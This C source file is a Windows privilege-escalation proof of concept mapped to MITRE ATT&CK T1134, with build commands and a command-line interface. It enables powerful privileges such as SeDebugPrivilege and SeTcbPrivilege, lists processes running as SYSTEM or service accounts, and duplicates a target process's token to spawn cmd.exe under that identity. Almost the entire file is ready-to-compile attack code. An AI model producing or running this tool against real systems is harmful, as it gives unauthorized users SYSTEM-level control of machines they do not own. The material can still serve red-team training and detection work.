/*
 * Token Manipulation — Privilege Escalation via Windows Token Abuse
 *
 * MITRE ATT&CK: T1134 — Access Token Manipulation
 * Severity: CRITICAL
 *
 * Demonstrates three techniques:
 *   1. Token Duplication — Duplicate a SYSTEM token and spawn process
 *   2. Token Impersonation — Impersonate a running SYSTEM process
 *   3. Privilege Enable — Enable disabled privileges (SeDebugPrivilege, etc.)
 *
 * Compile:
 *   x86_64-w64-mingw32-gcc -o token_manip.exe token_manipulation.c -ladvapi32
 *   cl token_manipulation.c /Fe:token_manip.exe advapi32.lib
 *
 * Usage:
 *   token_manip.exe enable       — Enable SeDebugPrivilege on current process
 *   token_manip.exe steal <PID>  — Steal token from process and spawn cmd
 *   token_manip.exe list         — List processes with interesting tokens
 */

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

#pragma comment(lib, "advapi32.lib")

BOOL EnablePrivilege(HANDLE hToken, LPCSTR privilege) {
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!LookupPrivilegeValueA(NULL, privilege, &luid)) {
        printf("[-] LookupPrivilegeValue failed for %s (error %lu)\n", privilege, GetLastError());
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
        printf("[-] AdjustTokenPrivileges failed (error %lu)\n", GetLastError());
        return FALSE;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        printf("[-] Privilege %s not assigned to token\n", privilege);
        return FALSE;
    }

    printf("[+] Enabled: %s\n", privilege);
    return TRUE;
}

void EnableAllPrivileges() {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        printf("[-] OpenProcessToken failed (error %lu)\n", GetLastError());
        return;
    }

    printf("[*] Enabling privileges on current token...\n\n");

    const char* privs[] = {
        "SeDebugPrivilege",
        "SeImpersonatePrivilege",
        "SeAssignPrimaryTokenPrivilege",
        "SeTcbPrivilege",
        "SeBackupPrivilege",
        "SeRestorePrivilege",
        "SeTakeOwnershipPrivilege",
        "SeLoadDriverPrivilege",
        "SeCreateTokenPrivilege",
        "SeIncreaseQuotaPrivilege",
        NULL
    };

    for (int i = 0; privs[i]; i++) {
        EnablePrivilege(hToken, privs[i]);
    }

    CloseHandle(hToken);
}

void StealToken(DWORD targetPid) {
    printf("[*] Attempting to steal token from PID %lu\n", targetPid);

    // Step 1: Enable SeDebugPrivilege
    HANDLE hMyToken;
    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hMyToken);
    EnablePrivilege(hMyToken, "SeDebugPrivilege");
    CloseHandle(hMyToken);

    // Step 2: Open target process
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, targetPid);
    if (!hProcess) {
        printf("[-] Cannot open process %lu (error %lu)\n", targetPid, GetLastError());
        printf("    Need SeDebugPrivilege or admin rights\n");
        return;
    }
    printf("[+] Opened process %lu\n", targetPid);

    // Step 3: Open process token
    HANDLE hToken;
    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
        printf("[-] OpenProcessToken failed (error %lu)\n", GetLastError());
        CloseHandle(hProcess);
        return;
    }

    // Step 4: Get token owner info
    char tokenUser[512];
    DWORD tokenUserSize = sizeof(tokenUser);
    TOKEN_USER* ptu = (TOKEN_USER*)tokenUser;

    if (GetTokenInformation(hToken, TokenUser, ptu, tokenUserSize, &tokenUserSize)) {
        char userName[256], domainName[256];
        DWORD userSize = sizeof(userName), domainSize = sizeof(domainName);
        SID_NAME_USE sidType;
        LookupAccountSidA(NULL, ptu->User.Sid, userName, &userSize, domainName, &domainSize, &sidType);
        printf("[+] Token owner: %s\\%s\n", domainName, userName);
    }

    // Step 5: Duplicate token
    HANDLE hDupToken;
    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL,
        SecurityImpersonation, TokenPrimary, &hDupToken)) {
        printf("[-] DuplicateTokenEx failed (error %lu)\n", GetLastError());
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return;
    }
    printf("[+] Token duplicated\n");

    // Step 6: Spawn cmd.exe with stolen token
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    if (CreateProcessWithTokenW(hDupToken, LOGON_WITH_PROFILE,
        L"C:\\Windows\\System32\\cmd.exe", NULL,
        CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi)) {
        printf("[+] Spawned cmd.exe with stolen token (PID %lu)\n", pi.dwProcessId);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        printf("[-] CreateProcessWithTokenW failed (error %lu), trying CreateProcessAsUser...\n", GetLastError());

        if (CreateProcessAsUserA(hDupToken, "C:\\Windows\\System32\\cmd.exe",
            NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
            printf("[+] Spawned cmd.exe (PID %lu)\n", pi.dwProcessId);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        } else {
            printf("[-] CreateProcessAsUser failed (error %lu)\n", GetLastError());
        }
    }

    CloseHandle(hDupToken);
    CloseHandle(hToken);
    CloseHandle(hProcess);
}

void ListInterestingTokens() {
    printf("[*] Enumerating processes with interesting tokens...\n\n");
    printf("%-8s %-30s %-30s %s\n", "PID", "Process", "User", "Privileges");
    printf("%-8s %-30s %-30s %s\n", "---", "-------", "----", "----------");

    // Enable debug privilege first
    HANDLE hMyToken;
    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hMyToken);
    EnablePrivilege(hMyToken, "SeDebugPrivilege");
    CloseHandle(hMyToken);

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe = { sizeof(pe) };

    if (Process32First(hSnapshot, &pe)) {
        do {
            HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
            if (!hProc) continue;

            HANDLE hToken;
            if (!OpenProcessToken(hProc, TOKEN_QUERY, &hToken)) {
                CloseHandle(hProc);
                continue;
            }

            // Get user
            char tokenUser[512];
            DWORD size = sizeof(tokenUser);
            TOKEN_USER* ptu = (TOKEN_USER*)tokenUser;
            char userName[256] = "?", domainName[256] = "?";

            if (GetTokenInformation(hToken, TokenUser, ptu, size, &size)) {
                DWORD uSize = sizeof(userName), dSize = sizeof(domainName);
                SID_NAME_USE sidType;
                LookupAccountSidA(NULL, ptu->User.Sid, userName, &uSize, domainName, &dSize, &sidType);
            }

            char fullUser[512];
            snprintf(fullUser, sizeof(fullUser), "%s\\%s", domainName, userName);

            // Check for interesting user contexts
            if (strstr(fullUser, "SYSTEM") || strstr(fullUser, "LOCAL SERVICE") ||
                strstr(fullUser, "NETWORK SERVICE")) {
                printf("%-8lu %-30s %-30s SYSTEM-level\n",
                    pe.th32ProcessID, pe.szExeFile, fullUser);
            }

            CloseHandle(hToken);
            CloseHandle(hProc);
        } while (Process32Next(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
}

int main(int argc, char* argv[]) {
    printf("[*] Windows Token Manipulation PoC\n\n");

    if (argc < 2) {
        printf("Usage:\n");
        printf("  %s enable       — Enable all possible privileges\n", argv[0]);
        printf("  %s steal <PID>  — Steal token from PID\n", argv[0]);
        printf("  %s list         — List SYSTEM processes\n", argv[0]);
        return 1;
    }

    if (strcmp(argv[1], "enable") == 0) {
        EnableAllPrivileges();
    } else if (strcmp(argv[1], "steal") == 0 && argc > 2) {
        StealToken(atoi(argv[2]));
    } else if (strcmp(argv[1], "list") == 0) {
        ListInterestingTokens();
    } else {
        printf("[-] Unknown command: %s\n", argv[1]);
    }

    return 0;
}
